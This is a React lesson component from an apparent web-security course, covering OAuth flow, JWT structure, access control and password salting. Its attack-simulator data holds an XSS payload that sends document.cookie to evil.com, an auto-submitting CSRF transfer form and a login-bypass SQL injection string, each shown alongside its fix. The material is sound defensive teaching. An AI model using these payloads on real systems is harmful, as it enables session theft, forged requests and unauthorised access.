import { useState, useEffect, useCallback } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { CheckCircle, ChevronDown, ChevronUp, HelpCircle, Lock, Unlock, Shield, Key, AlertTriangle, Eye, EyeOff } from 'lucide-react'

function Term({ word, definition, onLearn }) {
  const [showTooltip, setShowTooltip] = useState(false)
  const handleClick = () => { setShowTooltip(!showTooltip); if (onLearn) onLearn(word) }
  return (
    <span className="relative inline-block">
      <span className="term cursor-pointer" onClick={handleClick}
        onMouseEnter={() => setShowTooltip(true)} onMouseLeave={() => setShowTooltip(false)}>{word}</span>
      <AnimatePresence>
        {showTooltip && (
          <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: 10 }}
            className="tooltip absolute bottom-full left-1/2 transform -translate-x-1/2 mb-2 w-64 p-3 z-50">
            <p className="font-semibold text-quest-primary mb-1">{word}</p>
            <p className="text-sm text-quest-text">{definition}</p>
          </motion.div>
        )}
      </AnimatePresence>
    </span>
  )
}

function DeepDive({ title, children, id, onRead }) {
  const [isOpen, setIsOpen] = useState(false)
  const toggle = () => { setIsOpen(!isOpen); if (!isOpen && onRead) onRead(id) }
  return (
    <div className="my-4 border border-quest-primary/20 rounded-lg overflow-hidden">
      <button onClick={toggle} className="w-full flex items-center justify-between p-4 bg-quest-primary/5 hover:bg-quest-primary/10 transition-colors">
        <div className="flex items-center gap-2">
          <HelpCircle size={18} className="text-quest-primary" />
          <span className="font-semibold text-quest-primary">{title}</span>
        </div>
        {isOpen ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
      </button>
      <AnimatePresence>
        {isOpen && (
          <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} className="overflow-hidden">
            <div className="p-4 text-sm text-quest-muted leading-relaxed">{children}</div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}

/* ── OAuth 2.0 Flow Steps ── */
const oauthSteps = [
  { id: 1, actor: 'User', action: 'Clicks "Login with Google"', target: 'Your App', color: 'text-sky-400', bg: 'bg-sky-500/20' },
  { id: 2, actor: 'Your App', action: 'Redirects to Google with client_id, redirect_uri, scope', target: 'Google Auth Server', color: 'text-purple-400', bg: 'bg-purple-500/20' },
  { id: 3, actor: 'User', action: 'Enters credentials & grants consent', target: 'Google Auth Server', color: 'text-sky-400', bg: 'bg-sky-500/20' },
  { id: 4, actor: 'Google', action: 'Redirects back with authorization code', target: 'Your App (redirect_uri)', color: 'text-green-400', bg: 'bg-green-500/20' },
  { id: 5, actor: 'Your App (Backend)', action: 'Exchanges code + client_secret for tokens', target: 'Google Token Endpoint', color: 'text-purple-400', bg: 'bg-purple-500/20' },
  { id: 6, actor: 'Google', action: 'Returns access_token + refresh_token', target: 'Your App (Backend)', color: 'text-green-400', bg: 'bg-green-500/20' },
  { id: 7, actor: 'Your App', action: 'Uses access_token to fetch user profile', target: 'Google API', color: 'text-yellow-400', bg: 'bg-yellow-500/20' },
]

/* ── Sample JWT for decoder ── */
const sampleJWT = {
  header: { alg: 'HS256', typ: 'JWT' },
  payload: {
    sub: '1234567890',
    name: 'Alice Engineer',
    email: 'alice@example.com',
    role: 'admin',
    iat: 1710000000,
    exp: 1710086400,
  },
  signature: 'SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
}

/* ── Attack scenarios ── */
const attackScenarios = [
  {
    id: 'xss',
    name: 'Cross-Site Scripting (XSS)',
    icon: '💉',
    color: 'text-red-400',
    bg: 'bg-red-500/20',
    description: 'Attacker injects malicious script into a web page viewed by other users.',
    vulnerable: `<div class="comment">
  <!-- User comment rendered without escaping -->
  <p>{userComment}</p>
</div>

// If userComment = '<script>fetch("evil.com/steal?cookie="+document.cookie)</script>'
// The script executes in every visitor's browser!`,
    fixed: `<div class="comment">
  <!-- Escape HTML entities before rendering -->
  <p>{escapeHtml(userComment)}</p>
</div>

// React does this automatically with JSX: {userComment}
// Use DOMPurify for rich HTML content
// Set Content-Security-Policy headers`,
    prevention: ['Escape all user input before rendering', 'Use Content-Security-Policy headers', 'React auto-escapes JSX by default', 'Never use dangerouslySetInnerHTML with user data'],
  },
  {
    id: 'csrf',
    name: 'Cross-Site Request Forgery (CSRF)',
    icon: '🎭',
    color: 'text-orange-400',
    bg: 'bg-orange-500/20',
    description: 'Attacker tricks a logged-in user into making unwanted requests to a site they are authenticated on.',
    vulnerable: `<!-- Attacker's malicious page -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- Or a hidden form that auto-submits -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit()</script>`,
    fixed: `// Server generates a unique CSRF token per session
app.get('/form', (req, res) => {
  const token = generateCSRFToken(req.session)
  res.render('form', { csrfToken: token })
})

// Token included in form & validated on submit
<input type="hidden" name="_csrf" value="{csrfToken}" />

// Also use SameSite cookies
Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly`,
    prevention: ['Use anti-CSRF tokens in forms', 'Set SameSite=Strict on cookies', 'Verify Origin and Referer headers', 'Use POST for state-changing operations'],
  },
  {
    id: 'sqli',
    name: 'SQL Injection',
    icon: '🗄️',
    color: 'text-yellow-400',
    bg: 'bg-yellow-500/20',
    description: 'Attacker manipulates SQL queries by injecting malicious input into form fields or URLs.',
    vulnerable: `// DANGEROUS: String concatenation in SQL
const query = "SELECT * FROM users WHERE username = '"
  + username + "' AND password = '" + password + "'"

// If username = "admin' OR '1'='1' --"
// Query becomes:
// SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
// AND password = '...'
// The -- comments out the password check!`,
    fixed: `// SAFE: Parameterized queries (prepared statements)
const query = "SELECT * FROM users WHERE username = $1 AND password = $2"
const result = await db.query(query, [username, hashedPassword])

// Or use an ORM
const user = await User.findOne({
  where: { username, password: hashedPassword }
})

// Always hash passwords with bcrypt/argon2!`,
    prevention: ['Always use parameterized queries', 'Use an ORM (Prisma, Sequelize, etc.)', 'Validate and sanitize all input', 'Apply principle of least privilege to DB users'],
  },
]

/* ── Quiz Questions ── */
const quizQuestions = [
  {
    id: 'q1',
    question: 'In the OAuth 2.0 Authorization Code flow, what does the client exchange for an access token?',
    options: [
      { id: 'a', text: 'The user\'s password', correct: false },
      { id: 'b', text: 'An authorization code + client secret', correct: true },
      { id: 'c', text: 'The API key directly', correct: false },
      { id: 'd', text: 'A refresh token only', correct: false },
    ],
  },
  {
    id: 'q2',
    question: 'Which part of a JWT is NOT visible to anyone who has the token?',
    options: [
      { id: 'a', text: 'The header (algorithm info)', correct: false },
      { id: 'b', text: 'The payload (claims like user ID, role)', correct: false },
      { id: 'c', text: 'None — all parts are base64-encoded, not encrypted', correct: true },
      { id: 'd', text: 'The signature', correct: false },
    ],
  },
  {
    id: 'q3',
    question: 'What is the PRIMARY purpose of HTTPS/TLS?',
    options: [
      { id: 'a', text: 'To speed up API responses', correct: false },
      { id: 'b', text: 'To encrypt data in transit and verify server identity', correct: true },
      { id: 'c', text: 'To prevent SQL injection attacks', correct: false },
      { id: 'd', text: 'To replace API keys', correct: false },
    ],
  },
  {
    id: 'q4',
    question: 'How does a CSRF attack work?',
    options: [
      { id: 'a', text: 'Injecting JavaScript into a web page', correct: false },
      { id: 'b', text: 'Intercepting network traffic between client and server', correct: false },
      { id: 'c', text: 'Tricking a user\'s browser into making authenticated requests to another site', correct: true },
      { id: 'd', text: 'Guessing a user\'s password through brute force', correct: false },
    ],
  },
  {
    id: 'q5',
    question: 'What is the difference between RBAC and ABAC?',
    options: [
      { id: 'a', text: 'RBAC uses roles (admin, editor); ABAC uses attributes (department, time of day, location)', correct: true },
      { id: 'b', text: 'RBAC is for APIs; ABAC is for databases', correct: false },
      { id: 'c', text: 'They are the same thing with different names', correct: false },
      { id: 'd', text: 'RBAC is more granular than ABAC', correct: false },
    ],
  },
  {
    id: 'q6',
    question: 'Why should passwords be salted before hashing?',
    options: [
      { id: 'a', text: 'To make the hash shorter and faster to compute', correct: false },
      { id: 'b', text: 'To prevent rainbow table attacks — identical passwords get different hashes', correct: true },
      { id: 'c', text: 'Salting is only needed for symmetric encryption', correct: false },
      { id: 'd', text: 'To comply with CORS policies', correct: false },
    ],
  },
  {
    id: 'q7',
    question: 'Which header helps prevent XSS attacks by controlling which scripts can execute?',
    options: [
      { id: 'a', text: 'X-Frame-Options', correct: false },
      { id: 'b', text: 'Access-Control-Allow-Origin', correct: false },
      { id: 'c', text: 'Content-Security-Policy', correct: true },
      { id: 'd', text: 'Strict-Transport-Security', correct: false },
    ],
  },
]

/* ── Helper: fake hash function for visualization ── */
function fakeHash(input) {
  let hash = 0
  for (let i = 0; i < input.length; i++) {
    const char = input.charCodeAt(i)
    hash = ((hash << 5) - hash) + char
    hash = hash & hash
  }
  const hex = Math.abs(hash).toString(16).padStart(8, '0')
  return `$2b$12$${hex}${hex}${hex.slice(0, 6)}...`
}

function fakeSaltedHash(input, salt) {
  let hash = 0
  const salted = salt + input
  for (let i = 0; i < salted.length; i++) {
    const char = salted.charCodeAt(i)
    hash = ((hash << 7) - hash) + char
    hash = hash & hash
  }
  const hex = Math.abs(hash).toString(16).padStart(8, '0')
  return `$2b$12$${salt.slice(0, 22)}${hex}${hex.slice(0, 9)}...`
}

/* ══════════════════════════════════════════════════════════ */
/*  Level 24 — Lock and Key: Security Fundamentals          */
/* ══════════════════════════════════════════════════════════ */

export default function Level24({ onComplete, learnTerm, markDeepDiveRead, isCompleted }) {
  const [currentSection, setCurrentSection] = useState(0)

  /* OAuth flow state */
  const [oauthStep, setOauthStep] = useState(0)
  const [oauthPlaying, setOauthPlaying] = useState(false)

  /* JWT decoder state */
  const [jwtActiveTab, setJwtActiveTab] = useState('header')
  const [jwtRevealed, setJwtRevealed] = useState(false)

  /* Attack simulator state */
  const [activeAttack, setActiveAttack] = useState(null)
  const [showFixed, setShowFixed] = useState(false)

  /* Password hashing state */
  const [passwordInput, setPasswordInput] = useState('mypassword123')
  const [showPlaintext, setShowPlaintext] = useState(true)
  const [hashSalt, setHashSalt] = useState('aB3xQ7mK')

  /* Quiz state */
  const [quizAnswers, setQuizAnswers] = useState({})
  const [quizSubmitted, setQuizSubmitted] = useState(false)

  /* OAuth autoplay */
  useEffect(() => {
    if (!oauthPlaying) return
    if (oauthStep >= oauthSteps.length) {
      setOauthPlaying(false)
      return
    }
    const timer = setTimeout(() => setOauthStep(prev => prev + 1), 1200)
    return () => clearTimeout(timer)
  }, [oauthPlaying, oauthStep])

  const startOAuthFlow = useCallback(() => {
    setOauthStep(0)
    setOauthPlaying(true)
  }, [])

  const handleQuizSubmit = useCallback(() => {
    setQuizSubmitted(true)
    if (onComplete) onComplete()
  }, [onComplete])

  const regenerateSalt = useCallback(() => {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    let salt = ''
    for (let i = 0; i < 8; i++) salt += chars[Math.floor(Math.random() * chars.length)]
    setHashSalt(salt)
  }, [])

  /* Section nav helpers */
  const sectionTitles = ['The Breach', 'OAuth 2.0 & JWT', 'Attack Vectors', 'Password Security', 'Quiz']

  return (
    <div className="max-w-4xl mx-auto space-y-8">
      {/* Level header */}
      <div className="text-center mb-8">
        <motion.div
          initial={{ scale: 0 }}
          animate={{ scale: 1 }}
          transition={{ type: 'spring', stiffness: 200, damping: 15 }}
          className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-red-500/20 mb-4"
        >
          <Shield size={32} className="text-red-400" />
        </motion.div>
        <h1 className="text-3xl font-bold mb-2">Lock and Key</h1>
        <p className="text-quest-muted">Level 24 — Security Fundamentals</p>
      </div>

      {/* Section navigation */}
      <div className="flex items-center justify-center gap-1 flex-wrap mb-6">
        {sectionTitles.map((title, i) => (
          <button
            key={i}
            onClick={() => setCurrentSection(i)}
            className={`px-3 py-1.5 rounded-full text-xs font-medium transition-all
              ${currentSection === i
                ? 'bg-red-500/20 text-red-400 ring-1 ring-red-500/30'
                : 'bg-quest-surface text-quest-muted hover:text-quest-text'}`}
          >
            {title}
          </button>
        ))}
      </div>

      {/* ═══════════════════ SECTION 0: THE BREACH ═══════════════════ */}
      {currentSection === 0 && (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
          <div className="concept-card">
            <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <AlertTriangle className="text-red-400" />
              The Breach
            </h2>

            <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-6 mb-6">
              <p className="text-red-400 font-mono text-sm mb-3">⚠ INCIDENT REPORT — 03:42 AM UTC</p>
              <p className="text-quest-muted mb-4 italic">
                "Someone leaked all your users' passwords. Plaintext. Every single one.
                Your CEO is on the phone. The press is calling. 2.3 million accounts compromised."
              </p>
              <p className="text-quest-muted text-sm">
                This is not hypothetical. It happened to LinkedIn (2012, 117M passwords), Adobe (2013, 153M),
                Equifax (2017, 147M personal records). Security is not optional — it is the foundation.
              </p>
            </div>

            <p className="text-quest-muted mb-6">
              In this level, we will build your security toolkit from the ground up:{' '}
              <Term word="OAuth 2.0" definition="An authorization framework that enables third-party applications to obtain limited access to a user's account on an HTTP service, without exposing the user's credentials. Uses tokens instead of passwords." onLearn={learnTerm} />,{' '}
              <Term word="JWT" definition="JSON Web Token — a compact, URL-safe token format that contains a JSON payload of claims. Consists of three base64-encoded parts: header, payload, and signature. Used for stateless authentication." onLearn={learnTerm} />,{' '}
              <Term word="HTTPS/TLS" definition="HTTPS is HTTP over TLS (Transport Layer Security). TLS encrypts all data in transit between client and server using asymmetric cryptography for key exchange and symmetric encryption for data transfer. Prevents eavesdropping and man-in-the-middle attacks." onLearn={learnTerm} />,{' '}
              <Term word="CORS" definition="Cross-Origin Resource Sharing — a browser security mechanism that controls which domains can make requests to your API. Configured via HTTP headers like Access-Control-Allow-Origin. Prevents unauthorized cross-origin requests." onLearn={learnTerm} />,{' '}
              and common attack vectors like{' '}
              <Term word="XSS" definition="Cross-Site Scripting — an attack where malicious scripts are injected into trusted websites. Stored XSS persists in the database; Reflected XSS comes from URL parameters; DOM-based XSS manipulates the page's JavaScript." onLearn={learnTerm} />,{' '}
              <Term word="CSRF" definition="Cross-Site Request Forgery — an attack that tricks a logged-in user's browser into making unwanted requests to a site where they are authenticated. Exploits the fact that browsers automatically include cookies with requests." onLearn={learnTerm} />, and{' '}
              <Term word="SQL Injection" definition="An attack where malicious SQL code is inserted into application queries through user input. Can read, modify, or delete database data. Prevented with parameterized queries and input validation." onLearn={learnTerm} />.
            </p>

            {/* Security layers overview */}
            <div className="bg-quest-bg rounded-xl p-6 mb-6">
              <h3 className="text-sm font-semibold mb-4">The Security Layers</h3>
              <div className="space-y-3">
                {[
                  { layer: 'Transport', desc: 'HTTPS/TLS encrypts data in transit', icon: Lock, color: 'text-green-400', bg: 'bg-green-500/15' },
                  { layer: 'Authentication', desc: 'OAuth 2.0, JWT — who are you?', icon: Key, color: 'text-sky-400', bg: 'bg-sky-500/15' },
                  { layer: 'Authorization', desc: 'RBAC, ABAC — what can you do?', icon: Shield, color: 'text-purple-400', bg: 'bg-purple-500/15' },
                  { layer: 'Input Validation', desc: 'Prevent XSS, SQL Injection, CSRF', icon: AlertTriangle, color: 'text-orange-400', bg: 'bg-orange-500/15' },
                  { layer: 'Data at Rest', desc: 'Password hashing, encryption, key management', icon: Lock, color: 'text-red-400', bg: 'bg-red-500/15' },
                ].map((item, i) => (
                  <motion.div
                    key={item.layer}
                    initial={{ opacity: 0, x: -20 }}
                    animate={{ opacity: 1, x: 0 }}
                    transition={{ delay: i * 0.1 }}
                    className={`flex items-center gap-4 p-3 rounded-lg ${item.bg}`}
                  >
                    <div className={`w-10 h-10 rounded-lg ${item.bg} flex items-center justify-center`}>
                      <item.icon size={20} className={item.color} />
                    </div>
                    <div>
                      <p className={`text-sm font-semibold ${item.color}`}>{item.layer}</p>
                      <p className="text-xs text-quest-muted">{item.desc}</p>
                    </div>
                  </motion.div>
                ))}
              </div>
            </div>

            <DeepDive id="security-mindset" title="The Security Mindset" onRead={markDeepDiveRead}>
              <div className="space-y-3 text-sm text-quest-muted">
                <p>
                  <strong className="text-quest-text">Defense in Depth:</strong> Never rely on a single security layer.
                  If your firewall fails, encryption should still protect data. If encryption is broken, access control
                  should limit the blast radius. Layer your defenses.
                </p>
                <p>
                  <strong className="text-quest-text">Principle of Least Privilege:</strong> Every user, process, and
                  service should have only the minimum permissions needed to do its job. A read-only API endpoint
                  should not have database write access.
                </p>
                <p>
                  <strong className="text-quest-text">Zero Trust:</strong> Never trust, always verify. Even internal
                  services behind a firewall should authenticate and authorize every request. Assume the network is
                  already compromised.
                </p>
              </div>
            </DeepDive>

            <div className="flex justify-end mt-6">
              <button onClick={() => setCurrentSection(1)} className="btn-primary flex items-center gap-2">
                OAuth 2.0 & JWT
                <Key size={18} />
              </button>
            </div>
          </div>
        </motion.div>
      )}

      {/* ═══════════════════ SECTION 1: OAUTH & JWT ═══════════════════ */}
      {currentSection === 1 && (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
          <div className="concept-card">
            <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <Key className="text-sky-400" />
              OAuth 2.0 — Authorization Code Flow
            </h2>

            <p className="text-quest-muted mb-6">
              Instead of your app handling passwords directly,{' '}
              <Term word="OAuth 2.0" definition="An authorization framework that lets users grant third-party apps limited access to their accounts without sharing passwords. The app receives tokens instead of credentials." onLearn={learnTerm} />{' '}
              delegates authentication to a trusted provider (Google, GitHub, etc.) and gives your app
              a time-limited{' '}
              <Term word="API Keys" definition="Simple tokens used to identify and authenticate an application (not a user). Unlike OAuth tokens, API keys typically do not expire and grant static permissions. Best for server-to-server communication, not user authentication." onLearn={learnTerm} />{' '}
              ... no, something better: scoped access tokens.
            </p>

            {/* OAuth flow visualization */}
            <div className="bg-quest-bg rounded-xl p-6 mb-6">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-sm font-semibold">Authorization Code Flow</h3>
                <button
                  onClick={startOAuthFlow}
                  disabled={oauthPlaying}
                  className="px-4 py-1.5 rounded-lg bg-sky-500/20 text-sky-400 text-xs font-medium hover:bg-sky-500/30 transition-colors disabled:opacity-50"
                >
                  {oauthPlaying ? 'Playing...' : 'Play Flow'}
                </button>
              </div>

              {/* Flow actors bar */}
              <div className="grid grid-cols-3 gap-3 mb-6">
                {[
                  { name: 'User (Browser)', color: 'text-sky-400', bg: 'bg-sky-500/15' },
                  { name: 'Your App', color: 'text-purple-400', bg: 'bg-purple-500/15' },
                  { name: 'Google (Auth Server)', color: 'text-green-400', bg: 'bg-green-500/15' },
                ].map(actor => (
                  <div key={actor.name} className={`text-center p-2 rounded-lg ${actor.bg}`}>
                    <p className={`text-xs font-semibold ${actor.color}`}>{actor.name}</p>
                  </div>
                ))}
              </div>

              {/* Flow steps */}
              <div className="space-y-2">
                {oauthSteps.map((step, i) => (
                  <motion.div
                    key={step.id}
                    initial={{ opacity: 0.3, scale: 0.95 }}
                    animate={
                      i < oauthStep
                        ? { opacity: 1, scale: 1 }
                        : i === oauthStep && oauthPlaying
                          ? { opacity: 1, scale: 1, x: [0, 4, 0] }
                          : { opacity: 0.3, scale: 0.95 }
                    }
                    transition={{ duration: 0.4 }}
                    className={`flex items-start gap-3 p-3 rounded-lg border transition-colors
                      ${i < oauthStep ? 'border-white/10 bg-quest-surface/50' : 'border-transparent'}`}
                  >
                    <div className={`w-7 h-7 rounded-full ${step.bg} flex items-center justify-center text-xs font-bold ${step.color} flex-shrink-0 mt-0.5`}>
                      {i < oauthStep ? '✓' : step.id}
                    </div>
                    <div className="min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className={`text-xs font-semibold ${step.color}`}>{step.actor}</span>
                        <span className="text-quest-muted text-xs">→</span>
                        <span className="text-xs text-quest-muted">{step.target}</span>
                      </div>
                      <p className="text-sm text-quest-text mt-0.5">{step.action}</p>
                    </div>
                  </motion.div>
                ))}
              </div>

              {oauthStep >= oauthSteps.length && (
                <motion.div
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  className="mt-4 p-3 rounded-lg bg-green-500/10 border border-green-500/30 text-center"
                >
                  <p className="text-green-400 text-sm font-medium">
                    User is now authenticated. Your app never saw their password.
                  </p>
                </motion.div>
              )}
            </div>

            <DeepDive id="oauth-grants" title="Other OAuth 2.0 Grant Types" onRead={markDeepDiveRead}>
              <div className="space-y-3 text-sm text-quest-muted">
                <p>
                  <strong className="text-quest-text">Client Credentials:</strong> For server-to-server communication
                  where no user is involved. The app authenticates with its own client_id and client_secret to get a token.
                  Common for microservices.
                </p>
                <p>
                  <strong className="text-quest-text">PKCE (Proof Key for Code Exchange):</strong> An extension for
                  public clients (mobile apps, SPAs) that cannot securely store a client_secret. Uses a code_verifier
                  and code_challenge to prevent authorization code interception.
                </p>
                <p>
                  <strong className="text-quest-text">Implicit (Deprecated):</strong> Used to return tokens directly
                  in the URL fragment. Deprecated because tokens were exposed in browser history and logs.
                  Use Authorization Code + PKCE instead.
                </p>
              </div>
            </DeepDive>

            {/* JWT Decoder */}
            <h2 className="text-2xl font-bold mt-10 mb-4 flex items-center gap-2">
              <Eye className="text-yellow-400" />
              JWT Decoder — What is Inside a Token?
            </h2>

            <p className="text-quest-muted mb-4">
              A{' '}
              <Term word="JWT" definition="JSON Web Token — three base64url-encoded parts separated by dots: header.payload.signature. The header specifies the algorithm, the payload contains claims (user data), and the signature verifies integrity. JWTs are signed, NOT encrypted — anyone can read the payload." onLearn={learnTerm} />{' '}
              looks like gibberish, but it is just base64-encoded JSON. Click each section to decode it.
            </p>

            <div className="bg-quest-bg rounded-xl p-6 mb-6">
              {/* Raw JWT representation */}
              <div className="font-mono text-xs p-4 rounded-lg bg-quest-surface mb-4 break-all leading-relaxed">
                <span className="text-red-400">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>
                <span className="text-quest-muted">.</span>
                <span className="text-purple-400">eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIEVuZ2luZWVyIn0</span>
                <span className="text-quest-muted">.</span>
                <span className="text-sky-400">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
              </div>

              {/* Tab buttons */}
              <div className="flex gap-2 mb-4">
                {[
                  { key: 'header', label: 'Header', color: 'text-red-400', bg: 'bg-red-500/20', ring: 'ring-red-500/30' },
                  { key: 'payload', label: 'Payload', color: 'text-purple-400', bg: 'bg-purple-500/20', ring: 'ring-purple-500/30' },
                  { key: 'signature', label: 'Signature', color: 'text-sky-400', bg: 'bg-sky-500/20', ring: 'ring-sky-500/30' },
                ].map(tab => (
                  <button
                    key={tab.key}
                    onClick={() => { setJwtActiveTab(tab.key); setJwtRevealed(true) }}
                    className={`px-4 py-2 rounded-lg text-xs font-medium transition-all
                      ${jwtActiveTab === tab.key ? `${tab.bg} ${tab.color} ring-1 ${tab.ring}` : 'bg-quest-surface text-quest-muted hover:text-quest-text'}`}
                  >
                    {tab.label}
                  </button>
                ))}
              </div>

              {/* Decoded content */}
              <AnimatePresence mode="wait">
                {jwtRevealed && (
                  <motion.div
                    key={jwtActiveTab}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -10 }}
                    className="bg-quest-surface rounded-lg p-4"
                  >
                    {jwtActiveTab === 'header' && (
                      <div>
                        <p className="text-xs text-red-400 font-semibold mb-2">HEADER (Algorithm & Token Type)</p>
                        <pre className="text-sm font-mono text-quest-text">
{JSON.stringify(sampleJWT.header, null, 2)}
                        </pre>
                        <p className="text-xs text-quest-muted mt-3">
                          Tells the server which signing algorithm to use for verification.
                          HS256 = HMAC with SHA-256 (symmetric). RS256 = RSA with SHA-256 (asymmetric).
                        </p>
                      </div>
                    )}
                    {jwtActiveTab === 'payload' && (
                      <div>
                        <p className="text-xs text-purple-400 font-semibold mb-2">PAYLOAD (Claims)</p>
                        <pre className="text-sm font-mono text-quest-text">
{JSON.stringify(sampleJWT.payload, null, 2)}
                        </pre>
                        <p className="text-xs text-quest-muted mt-3">
                          <strong className="text-orange-400">Warning:</strong> This is NOT encrypted.
                          Anyone with the token can decode and read these claims.
                          Never put secrets (passwords, API keys) in a JWT payload.
                        </p>
                      </div>
                    )}
                    {jwtActiveTab === 'signature' && (
                      <div>
                        <p className="text-xs text-sky-400 font-semibold mb-2">SIGNATURE (Integrity Verification)</p>
                        <code className="block text-sm font-mono text-quest-text mb-3 break-all">
                          {sampleJWT.signature}
                        </code>
                        <div className="bg-quest-bg rounded-lg p-3 text-xs font-mono text-quest-muted">
                          HMACSHA256(<br />
                          &nbsp;&nbsp;base64UrlEncode(header) + "." + base64UrlEncode(payload),<br />
                          &nbsp;&nbsp;secret<br />
                          )
                        </div>
                        <p className="text-xs text-quest-muted mt-3">
                          The server recalculates this signature using its secret key. If someone tampers
                          with the header or payload, the signature will not match and the token is rejected.
                        </p>
                      </div>
                    )}
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            <DeepDive id="jwt-pitfalls" title="JWT Pitfalls and Best Practices" onRead={markDeepDiveRead}>
              <div className="space-y-3 text-sm text-quest-muted">
                <p>
                  <strong className="text-quest-text">Token Size:</strong> Every claim you add increases token size.
                  JWTs are sent with every request (in the Authorization header). Keep payloads lean — store
                  only essential claims like user ID and role.
                </p>
                <p>
                  <strong className="text-quest-text">Revocation Problem:</strong> JWTs are stateless — once issued,
                  they are valid until expiration. You cannot "log out" a JWT without maintaining a blacklist
                  (which defeats the stateless benefit). Use short expiration times (15 min) + refresh tokens.
                </p>
                <p>
                  <strong className="text-quest-text">Algorithm Confusion Attack:</strong> If your server accepts
                  both HS256 (symmetric) and RS256 (asymmetric), an attacker can sign a token with HS256 using
                  the public key as the secret. Always validate the algorithm on the server side.
                </p>
              </div>
            </DeepDive>

            {/* RBAC explanation */}
            <div className="bg-quest-surface rounded-xl p-5 mb-6">
              <h3 className="text-sm font-semibold mb-3 flex items-center gap-2">
                <Shield size={16} className="text-purple-400" />
                <Term word="RBAC" definition="Role-Based Access Control — assigns permissions to roles (admin, editor, viewer), then assigns roles to users. Simple and widely used. Example: admins can delete, editors can write, viewers can only read." onLearn={learnTerm} /> vs ABAC
              </h3>
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-quest-bg rounded-lg p-4">
                  <p className="text-xs font-semibold text-purple-400 mb-2">RBAC (Role-Based)</p>
                  <div className="space-y-2 text-xs text-quest-muted">
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 rounded bg-red-500/20 text-red-400 font-mono">admin</span>
                      <span>→ read, write, delete, manage users</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 rounded bg-yellow-500/20 text-yellow-400 font-mono">editor</span>
                      <span>→ read, write</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 rounded bg-green-500/20 text-green-400 font-mono">viewer</span>
                      <span>→ read only</span>
                    </div>
                  </div>
                  <p className="text-[11px] text-quest-muted mt-3">Simple. Best for most apps.</p>
                </div>
                <div className="bg-quest-bg rounded-lg p-4">
                  <p className="text-xs font-semibold text-sky-400 mb-2">ABAC (Attribute-Based)</p>
                  <div className="space-y-2 text-xs text-quest-muted">
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 rounded bg-sky-500/20 text-sky-400 font-mono">if</span>
                      <span>department == "engineering"</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 rounded bg-sky-500/20 text-sky-400 font-mono">and</span>
                      <span>time between 9AM-6PM</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 rounded bg-sky-500/20 text-sky-400 font-mono">and</span>
                      <span>ip in office_range</span>
                    </div>
                  </div>
                  <p className="text-[11px] text-quest-muted mt-3">Granular. For complex enterprise needs.</p>
                </div>
              </div>
            </div>

            <div className="flex justify-between mt-6">
              <button onClick={() => setCurrentSection(0)} className="btn-secondary flex items-center gap-2">
                <ChevronUp size={18} className="rotate-[-90deg]" />
                Back
              </button>
              <button onClick={() => setCurrentSection(2)} className="btn-primary flex items-center gap-2">
                Attack Vectors
                <AlertTriangle size={18} />
              </button>
            </div>
          </div>
        </motion.div>
      )}

      {/* ═══════════════════ SECTION 2: ATTACK VECTORS ═══════════════════ */}
      {currentSection === 2 && (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="space-y-6">
          <div className="concept-card">
            <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
              <AlertTriangle className="text-orange-400" />
              Attack Simulator — Know Your Enemy
            </h2>

            <p className="text-quest-muted mb-6">
              You cannot defend against what you do not understand. Select an attack type to see how it works
              and how to prevent it. This is educational — understanding attacks is the first step to building
              secure systems.
            </p>

            {/* Attack type selector */}
            <div className="grid md:grid-cols-3 gap-3 mb-6">
              {attackScenarios.map(attack => (
                <motion.button
                  key={attack.id}
                  onClick={() => { setActiveAttack(attack.id); setShowFixed(false) }}
                  whileHover={{ scale: 1.02 }}
                  className={`text-left p-4 rounded-xl border transition-all
                    ${activeAttack === attack.id
                      ? `${attack.bg} border-white/20 ring-1 ring-white/10`
                      : 'bg-quest-bg border-white/5 hover:border-white/15'}`}
                >
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-xl">{attack.icon}</span>
                    <h4 className={`text-sm font-semibold ${attack.color}`}>{attack.name}</h4>
                  </div>
                  <p className="text-[11px] text-quest-muted leading-relaxed">{attack.description}</p>
